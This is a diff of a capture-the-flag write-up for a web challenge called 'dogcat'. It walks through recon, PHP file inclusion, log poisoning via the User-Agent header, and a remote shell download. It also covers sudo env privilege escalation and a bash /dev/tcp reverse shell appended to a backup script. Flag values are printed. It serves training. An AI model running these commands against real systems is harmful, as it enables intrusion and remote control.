@@ -13,7 +13,7 @@ Running nmap to search for available services and versions: ```nmap -sC -sV 10.1
 ??? output "Nmap output"
     Result: two ports open SSH on 22 and HTTP on 80
 
-    ```txt
+    ``` txt
     Host is up (0.021s latency).
     Not shown: 998 closed ports
     PORT   STATE SERVICE VERSION
@@ -32,13 +32,13 @@ Running nmap to search for available services and versions: ```nmap -sC -sV 10.1
 
 Let's run gobuster to check for available folders using this command:
 
-```sh
+``` sh
 gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.46.238:80
 ```
 
 Gobuster reveals the following three folders:
 
-```sh
+``` sh
 /cats                 (Status: 301) [Size: 311] [--> http://10.10.46.238/cats/]
 /dogs                 (Status: 301) [Size: 311] [--> http://10.10.46.238/dogs/]
 /server-status        (Status: 403) [Size: 277]
@@ -48,7 +48,7 @@ So basically we have a folder /dog with random dog pics and a folder /cat with r
 
 Opening [/server-status](http://httpd.apache.org/docs/2.4/mod/mod_status.html) we get the error so probably with a .htaccess file.
 
-```txt
+``` txt
 Forbidden
 
 You don't have permission to access this resource.
@@ -60,7 +60,7 @@ Apache/2.4.38 (Debian)
 Running nikto confirms the apache web server and shows PHP is used: ```nikto -h 10.10.46.238```
 
 ??? output "nikto output"
-    ```sh
+    ``` sh
     nikto -h 10.10.46.238
     - Nikto v2.1.6
     ---------------------------------------------------------------------------
@@ -96,13 +96,13 @@ Let's look at the "view?" parameter in more detail:
 
 Changing the view parameter to "something" we get this error:
 
-```txt
+``` txt
 Sorry, only dogs or cats are allowed.
 ```
 
 Changing the view parameter to "somethingwithdog" we get this error:
 
-```txt
+``` txt
 Warning: include(somethingwithdog.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24
 
 Warning: include(): Failed opening 'somethingwithdog.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
@@ -131,7 +131,7 @@ With './cat/../index' we add they keyword cat and move back to the main web fold
 
 This results in the following string which is the base64 encoded representation of the index.php:
 
-```sh
+``` sh
 echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 --decode
 ```
 
@@ -189,7 +189,7 @@ We get the message: ```Here you go!PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfN
 
 Which we can decode as follows to get the first flag:
 
-```sh
+``` sh
 echo "PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2d=" | base64 --decode
 ```
 
@@ -203,7 +203,7 @@ We can try to inject PHP code to the access.log and trigger the code by visiting
 
 Unfortunantly this fails as e.g. all spaces are URL encoded. However, there are clear spaces visible in the user-agent. Let's try to change the user-agent string:
 
-```sh
+``` sh
 curl -A "<?php echo "HI!";?>" http://10.10.46.238
 ```
 
@@ -222,25 +222,25 @@ $port = 9999;          // CHANGE THIS
 
 Serve the file e.g. with python as follows:
 
-```py
+``` py
 python -m http.server 9090
 ```
 
 And start netcat on port 9999 in a second shell:
 
-```sh
+``` sh
 nc -lvnp 9999
 ```
 
 Now let's run a GET request with a custom user-agent that includes PHP to get the reverse-shell
 
-```sh
+``` sh
 curl -A "<?php file_put_contents('shell.php',file_get_contents('http://10.9.182.239:9090/shell.php')); ?>" http://10.10.46.238
 ```
 
 Alternatively we could use any other tool to send a GET request with custom user-agent string. E.g. burp-suite or write a python script like so:
 
-```py
+``` py
 import requests
 print (requests.get('http://10.10.46.238/?view=cat', headers={'User-Agent': '<?php file_put_contents("shell.php",file_get_contents("http://10.9.182.239:9090/shell.php")); ?>',}).text)
 ```
@@ -262,7 +262,7 @@ We can now start the shell.php located in the the main web folder:
 On the netcat terminal we should now have a command prompt :)
 Running ```whoami``` we see we are user "www-data". Searching for flag2 reveals the following file:
 
-```sh
+``` sh
 find / -type f -iname "flag*"
 var/www/html/flag.php
 var/www/flag2_QMW7JvaY2LvK.txt
@@ -278,13 +278,13 @@ Btw, it is possible to view flag2 within the browser and without reverse shell:
 
 Now that we have a shell as user "www-data" let's see what this user is allowed to do:
 
-```sh
+``` sh
 sudo -l
 ```
 
 We can [exploit the env privilege](https://gtfobins.github.io/) with this command to gain root access:
 
-```sh
+``` sh
 sudo /usr/bin/env sudo -i
 ```
 
@@ -292,7 +292,7 @@ Running ```whoami``` we can see that we are root.
 
 Now, let's again look for a flag:
 
-```sh
+``` sh
 find / -type f -iname "flag*"
 /root/flag3.txt
 ```
@@ -303,7 +303,7 @@ The last challenge is to find flag 4 which is nowhere to be found on the current
 
 List IP addresses connected to your server on port 80
 
-```sh
+``` sh
 netstat -tn 2>/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head
 ```
 
@@ -313,7 +313,7 @@ See if proc/self/cgroup contains "docker" or "lxc": ```grep 'docker\|lxc' /proc/
 
 or run this script:
 
-```sh
+``` sh
 echo IsContainer: ; if [[ -f /.dockerenv ]] || grep -Eq '(lxc|docker)' /proc/1/cgroup; then echo True; else echo False; fi
 ```
 
@@ -321,13 +321,13 @@ So we know we are running in a container.
 
 Let us look around and find other interesting files e.g. search for largest files:
 
-```sh
+``` sh
 lsof / | awk '{ if($7 > 1048576) print $7/1048576 "MB" " " $9 " " $1 }' | sort -n -u | tail
 ```
 
 or search for newest files
 
-```sh
+``` sh
 find / -type d \( -name sys -o -name proc \) -prune -o -name "*"  -mtime -0.02 -print
 ```
 
@@ -340,13 +340,13 @@ Let's try to exploit the backup.sh with a bash reverse shell:
 
 First, start a new netcat session on your system:
 
-```sh
+``` sh
 nc -lvnp 7777
 ```
 
 Then append the bash reverse shell to the backup script:
 
-```sh
+``` sh
 echo "bash -i >& /dev/tcp/10.9.182.239/7777 0>&1" >> backup.sh
 ```
 
@@ -356,7 +356,7 @@ Running ```whoami``` we can see that we are root - whoop whoop!
 
 Let's search for flag 4:
 
-```sh
+``` sh
 find / -type f -iname "flag*"
 container/flag4.txt
 ```
